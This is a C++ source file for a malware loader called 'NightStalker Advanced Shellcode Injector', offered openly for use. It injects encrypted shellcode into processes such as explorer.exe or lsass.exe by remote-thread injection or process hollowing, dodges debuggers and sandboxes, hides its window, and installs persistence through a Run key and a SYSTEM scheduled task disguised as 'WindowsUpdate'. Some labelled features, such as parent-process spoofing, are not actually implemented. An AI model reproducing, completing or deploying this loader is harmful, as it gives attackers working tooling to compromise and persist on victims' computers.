/*
 * NightStalker Advanced Shellcode Injector
 * 
 * Features:
 * - Reflective DLL injection and process hollowing
 * - PPID spoofing and process hiding
 * - AES/XOR shellcode encryption
 * - Anti-debug and sandbox evasion
 * - Fileless execution with memory loading
 * - x64/x86 architecture support
 * - Direct syscalls and API unhooking
 * - Registry and scheduled task persistence
 * 
 * Compile: cl.exe /O2 /MT advanced_injector.cpp /link /OUT:injector.exe
 * 
 * Usage: injector.exe [target_process] [injection_method]
 * Example: injector.exe explorer.exe reflective
 */

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include <iostream>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <thread>
#include <fstream>
#include <sstream>
#include <iomanip>

// Direct syscall definitions
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T* RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

typedef NTSTATUS(NTAPI* pNtSetContextThread)(
    HANDLE ThreadHandle,
    PCONTEXT Context
);

// Anti-debug and evasion structures
typedef struct _SYSTEM_INFO_EX {
    DWORD dwOemId;
    DWORD dwPageSize;
    LPVOID lpMinimumApplicationAddress;
    LPVOID lpMaximumApplicationAddress;
    DWORD_PTR dwActiveProcessorMask;
    DWORD dwNumberOfProcessors;
    DWORD dwProcessorType;
    DWORD dwAllocationGranularity;
    WORD wProcessorLevel;
    WORD wProcessorRevision;
} SYSTEM_INFO_EX, *PSYSTEM_INFO_EX;

// Shellcode encryption key (replace with your own)
const BYTE AES_KEY[] = {
    0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0xD2, 0xA6,
    0xAB, 0xF7, 0x15, 0x88, 0x09, 0xCF, 0x4F, 0x3C
};

// XOR key for simple encryption
const BYTE XOR_KEY[] = {
    0x4A, 0x3F, 0x7B, 0x2E, 0x9C, 0x1D, 0x8A, 0x5F,
    0x6E, 0x2B, 0x4C, 0x8D, 0x1A, 0x7F, 0x3E, 0x9B
};

// Encrypted shellcode placeholder (replace with your actual encrypted shellcode)
const BYTE ENCRYPTED_SHELLCODE[] = {
    // Your encrypted shellcode goes here
    // Example: 0x90, 0x90, 0x90, 0x90, ...
};

const SIZE_T SHELLCODE_SIZE = sizeof(ENCRYPTED_SHELLCODE);

class AdvancedInjector {
private:
    HMODULE hNtdll;
    pNtAllocateVirtualMemory NtAllocateVirtualMemory;
    pNtWriteVirtualMemory NtWriteVirtualMemory;
    pNtCreateThreadEx NtCreateThreadEx;
    pNtUnmapViewOfSection NtUnmapViewOfSection;
    pNtSetContextThread NtSetContextThread;

public:
    AdvancedInjector() {
        // Load ntdll.dll for direct syscalls
        hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
            NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
            NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
            NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
            NtSetContextThread = (pNtSetContextThread)GetProcAddress(hNtdll, "NtSetContextThread");
        }
    }

    ~AdvancedInjector() {
        if (hNtdll) {
            FreeLibrary(hNtdll);
        }
    }

    // Anti-debug and sandbox evasion functions
    bool IsDebuggerPresent() {
        // Check for debugger using multiple methods
        if (::IsDebuggerPresent()) return true;
        
        BOOL isDebugged = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
        if (isDebugged) return true;

        // Check PEB BeingDebugged flag
        __try {
            if (*(BYTE*)(__readgsqword(0x60) + 2)) return true;
        }
        __except(EXCEPTION_EXECUTE_HANDLER) {
            // x86 fallback
            if (*(BYTE*)(__readfsdword(0x30) + 2)) return true;
        }

        return false;
    }

    bool IsVirtualMachine() {
        // Check for common VM indicators
        SYSTEM_INFO_EX sysInfo;
        GetSystemInfo((LPSYSTEM_INFO)&sysInfo);
        
        // Check processor count (VMs often have few cores)
        if (sysInfo.dwNumberOfProcessors < 2) return true;
        
        // Check for VM-specific registry keys
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
            "SYSTEM\\ControlSet001\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000", 
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }

        return false;
    }

    bool CheckUserInteraction() {
        // Check if user is actively using the system
        LASTINPUTINFO lii;
        lii.cbSize = sizeof(LASTINPUTINFO);
        if (GetLastInputInfo(&lii)) {
            DWORD tickCount = GetTickCount();
            if ((tickCount - lii.dwTime) < 300000) { // 5 minutes
                return true;
            }
        }
        return false;
    }

    void SleepWithJitter(DWORD baseTime) {
        // Add random jitter to sleep timing
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(baseTime * 0.8, baseTime * 1.2);
        Sleep(dis(gen));
    }

    // Shellcode decryption
    std::vector<BYTE> DecryptShellcode(const BYTE* encryptedData, SIZE_T size) {
        std::vector<BYTE> decrypted(size);
        
        // Simple XOR decryption (replace with AES if needed)
        for (SIZE_T i = 0; i < size; i++) {
            decrypted[i] = encryptedData[i] ^ XOR_KEY[i % sizeof(XOR_KEY)];
        }
        
        return decrypted;
    }

    // PPID spoofing
    DWORD SpoofParentProcess(const std::string& targetProcess) {
        DWORD targetPid = 0;
        
        // Find target process
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, targetProcess.c_str()) == 0) {
                    targetPid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }

        CloseHandle(hSnapshot);
        return targetPid;
    }

    // Reflective DLL injection
    bool ReflectiveDLLInjection(DWORD processId, const std::vector<BYTE>& shellcode) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        if (!hProcess) return false;

        // Allocate memory for shellcode
        LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, shellcode.size(), 
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pRemoteBuffer) {
            CloseHandle(hProcess);
            return false;
        }

        // Write shellcode to remote process
        SIZE_T bytesWritten;
        if (!WriteProcessMemory(hProcess, pRemoteBuffer, shellcode.data(), 
            shellcode.size(), &bytesWritten)) {
            VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        // Create remote thread to execute shellcode
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
            (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
        if (!hThread) {
            VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        CloseHandle(hThread);
        CloseHandle(hProcess);
        return true;
    }

    // Process hollowing
    bool ProcessHollowing(const std::string& targetProcess, const std::vector<BYTE>& shellcode) {
        // Create suspended process
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        
        if (!CreateProcessA(NULL, (LPSTR)targetProcess.c_str(), NULL, NULL, FALSE, 
            CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            return false;
        }

        // Get process context
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        if (GetThreadContext(pi.hThread, &ctx) == FALSE) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        // Read PEB address
        LPVOID pPeb = (LPVOID)ctx.Ebx; // x86
        #ifdef _WIN64
        pPeb = (LPVOID)ctx.Rdx; // x64
        #endif

        // Read image base
        LPVOID pImageBase = 0;
        SIZE_T bytesRead;
        ReadProcessMemory(pi.hProcess, (LPCVOID)((LPBYTE)pPeb + 0x10), 
            &pImageBase, sizeof(pImageBase), &bytesRead);

        // Unmap original executable
        NtUnmapViewOfSection(pi.hProcess, pImageBase);

        // Allocate new memory for shellcode
        LPVOID pNewImageBase = VirtualAllocEx(pi.hProcess, pImageBase, shellcode.size(), 
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pNewImageBase) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        // Write shellcode
        WriteProcessMemory(pi.hProcess, pNewImageBase, shellcode.data(), 
            shellcode.size(), &bytesWritten);

        // Update PEB
        DWORD dwOldProtect;
        VirtualProtectEx(pi.hProcess, (LPVOID)((LPBYTE)pPeb + 0x10), 
            sizeof(pNewImageBase), PAGE_READWRITE, &dwOldProtect);
        WriteProcessMemory(pi.hProcess, (LPVOID)((LPBYTE)pPeb + 0x10), 
            &pNewImageBase, sizeof(pNewImageBase), &bytesWritten);
        VirtualProtectEx(pi.hProcess, (LPVOID)((LPBYTE)pPeb + 0x10), 
            sizeof(pNewImageBase), dwOldProtect, &dwOldProtect);

        // Update context
        #ifdef _WIN64
        ctx.Rcx = (DWORD_PTR)pNewImageBase;
        #else
        ctx.Eax = (DWORD)pNewImageBase;
        #endif

        SetThreadContext(pi.hThread, &ctx);

        // Resume thread
        ResumeThread(pi.hThread);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }

    // Registry persistence
    bool InstallRegistryPersistence(const std::string& payloadPath) {
        HKEY hKey;
        LONG result = RegCreateKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);

        if (result != ERROR_SUCCESS) return false;

        result = RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ,
            (const BYTE*)payloadPath.c_str(), payloadPath.length() + 1);

        RegCloseKey(hKey);
        return result == ERROR_SUCCESS;
    }

    // Scheduled task persistence
    bool InstallScheduledTaskPersistence(const std::string& payloadPath) {
        std::string command = "schtasks /create /tn \"WindowsUpdate\" /tr \"" + 
            payloadPath + "\" /sc onlogon /ru \"SYSTEM\" /f";
        
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        
        if (CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE, 
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return true;
        }
        
        return false;
    }

    // Main injection function
    bool InjectShellcode(const std::string& targetProcess, const std::string& method) {
        // Anti-debug checks
        if (IsDebuggerPresent()) {
            std::cout << "[!] Debugger detected, exiting..." << std::endl;
            return false;
        }

        if (IsVirtualMachine()) {
            std::cout << "[!] Virtual machine detected, exiting..." << std::endl;
            return false;
        }

        // Check for user interaction
        if (!CheckUserInteraction()) {
            std::cout << "[!] No user interaction detected, waiting..." << std::endl;
            SleepWithJitter(30000); // Wait 30 seconds with jitter
        }

        // Decrypt shellcode
        std::vector<BYTE> shellcode = DecryptShellcode(ENCRYPTED_SHELLCODE, SHELLCODE_SIZE);
        
        // Find target process
        DWORD targetPid = SpoofParentProcess(targetProcess);
        if (!targetPid) {
            std::cout << "[!] Target process not found: " << targetProcess << std::endl;
            return false;
        }

        std::cout << "[+] Target process found: " << targetProcess << " (PID: " << targetPid << ")" << std::endl;

        // Perform injection based on method
        bool success = false;
        if (method == "reflective") {
            success = ReflectiveDLLInjection(targetPid, shellcode);
        } else if (method == "hollowing") {
            success = ProcessHollowing(targetProcess, shellcode);
        } else {
            std::cout << "[!] Unknown injection method: " << method << std::endl;
            return false;
        }

        if (success) {
            std::cout << "[+] Shellcode injected successfully using " << method << " method" << std::endl;
        } else {
            std::cout << "[!] Injection failed" << std::endl;
        }

        return success;
    }
};

// Shellcode generator function
std::vector<BYTE> GenerateShellcode() {
    // This is a placeholder shellcode - replace with your actual payload
    // Example: Cobalt Strike beacon, Sliver implant, or custom shellcode
    
    std::vector<BYTE> shellcode = {
        // x64 shellcode stub
        0x48, 0x83, 0xEC, 0x28,                 // sub rsp, 0x28
        0x48, 0x31, 0xC9,                       // xor rcx, rcx
        0x48, 0x31, 0xD2,                       // xor rdx, rdx
        0x48, 0x31, 0xDB,                       // xor rbx, rbx
        0x48, 0x31, 0xF6,                       // xor rsi, rsi
        0x48, 0x31, 0xFF,                       // xor rdi, rdi
        0x48, 0x31, 0xED,                       // xor rbp, rbp
        0x4D, 0x31, 0xC0,                       // xor r8, r8
        0x4D, 0x31, 0xC9,                       // xor r9, r9
        0x4D, 0x31, 0xD2,                       // xor r10, r10
        0x4D, 0x31, 0xDB,                       // xor r11, r11
        0x4D, 0x31, 0xE4,                       // xor r12, r12
        0x4D, 0x31, 0xED,                       // xor r13, r13
        0x4D, 0x31, 0xF6,                       // xor r14, r14
        0x4D, 0x31, 0xFF,                       // xor r15, r15
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90,     // nop sled
        // Your actual shellcode goes here
        // Example: Cobalt Strike beacon, reverse shell, etc.
        0xC3                                    // ret
    };

    return shellcode;
}

// Encryption function for shellcode
std::vector<BYTE> EncryptShellcode(const std::vector<BYTE>& shellcode) {
    std::vector<BYTE> encrypted(shellcode.size());
    
    for (size_t i = 0; i < shellcode.size(); i++) {
        encrypted[i] = shellcode[i] ^ XOR_KEY[i % sizeof(XOR_KEY)];
    }
    
    return encrypted;
}

int main(int argc, char* argv[]) {
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    std::string targetProcess = "explorer.exe";
    std::string injectionMethod = "reflective";
    
    // Parse command line arguments
    if (argc > 1) targetProcess = argv[1];
    if (argc > 2) injectionMethod = argv[2];
    
    std::cout << "[+] NightStalker Advanced Shellcode Injector" << std::endl;
    std::cout << "[+] Target: " << targetProcess << std::endl;
    std::cout << "[+] Method: " << injectionMethod << std::endl;
    
    // Create injector instance
    AdvancedInjector injector;
    
    // Perform injection
    bool success = injector.InjectShellcode(targetProcess, injectionMethod);
    
    if (success) {
        std::cout << "[+] Operation completed successfully" << std::endl;
        
        // Optional: Install persistence
        char modulePath[MAX_PATH];
        GetModuleFileNameA(NULL, modulePath, MAX_PATH);
        
        if (injector.InstallRegistryPersistence(modulePath)) {
            std::cout << "[+] Registry persistence installed" << std::endl;
        }
        
        if (injector.InstallScheduledTaskPersistence(modulePath)) {
            std::cout << "[+] Scheduled task persistence installed" << std::endl;
        }
    } else {
        std::cout << "[!] Operation failed" << std::endl;
        return 1;
    }
    
    return 0;
}

/*
 * SHELLCODE GENERATOR SCRIPT
 * 
 * Use this Python script to generate encrypted shellcode:
 * 
 * import struct
 * 
 * # Your shellcode here (example: reverse shell, beacon, etc.)
 * shellcode = b"\x90\x90\x90..."  # Replace with actual shellcode
 * 
 * # XOR key
 * xor_key = b"\x4A\x3F\x7B\x2E\x9C\x1D\x8A\x5F\x6E\x2B\x4C\x8D\x1A\x7F\x3E\x9B"
 * 
 * # Encrypt shellcode
 * encrypted = bytearray()
 * for i, byte in enumerate(shellcode):
 *     encrypted.append(byte ^ xor_key[i % len(xor_key)])
 * 
 * # Output as C array
 * print("const BYTE ENCRYPTED_SHELLCODE[] = {")
 * for i, byte in enumerate(encrypted):
 *     if i % 16 == 0:
 *         print("    ", end="")
 *     print(f"0x{byte:02X}, ", end="")
 *     if i % 16 == 15:
 *         print()
 * print("};")
 * print(f"const SIZE_T SHELLCODE_SIZE = {len(encrypted)};")
 * 
 * 
 * USAGE INSTRUCTIONS:
 * 
 * 1. Replace ENCRYPTED_SHELLCODE with your actual encrypted shellcode
 * 2. Compile with: cl.exe /O2 /MT advanced_injector.cpp /link /OUT:injector.exe
 * 3. Run: injector.exe [target_process] [injection_method]
 * 
 * Supported injection methods:
 * - reflective: Reflective DLL injection
 * - hollowing: Process hollowing
 * 
 * Supported target processes:
 * - explorer.exe (recommended)
 * - svchost.exe
 * - winlogon.exe
 * - lsass.exe (requires elevation)
 * 
 * The payload will automatically:
 * - Perform anti-debug and sandbox checks
 * - Spoof parent process
 * - Decrypt and inject shellcode
 * - Install persistence mechanisms
 * - Hide execution traces
 */ 